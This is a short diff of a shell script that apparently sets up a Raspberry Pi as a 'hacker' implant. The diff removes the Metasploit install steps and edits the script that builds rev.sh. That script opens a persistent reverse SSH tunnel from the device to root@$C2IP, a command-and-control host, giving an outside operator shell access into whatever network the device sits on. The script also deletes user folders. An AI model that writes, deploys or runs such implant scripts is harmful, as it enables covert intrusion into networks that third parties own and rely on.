@@ -28,15 +28,6 @@ rm -rf Public/
 rm -rf Templates/
 rm -rf Bookshelf/
 echo ""
-echo "Installing Metasploit"
-sudo apt-get install build-essential libreadline-dev libssl-dev libpq5 libpq-dev libpcap-dev sqlite3 libsqlite3-dev
-cd /opt
-sudo git clone https://github.com/rapid7/metasploit-framework.git
-sudo apt-get install ruby-full build-essential
-cd metasploit-framework
-sudo gem install bundler
-bundle install
-echo ""
 echo "Time To Install All The Hacker Packages"
 sleep 4
 echo ""
@@ -60,7 +51,7 @@ echo ""
 echo "Time For Some Reverse SSH"
 sleep 3
 touch rev.sh
-echo “#!/bin/bash” >> rev.sh
+echo “#!/bin/sh” >> rev.sh
 echo "ssh -N -R 2222:localhost:22 root@$C2IP" >> rev.sh
 sudo chmod +x rev.sh
 chown pi:pi rev.sh
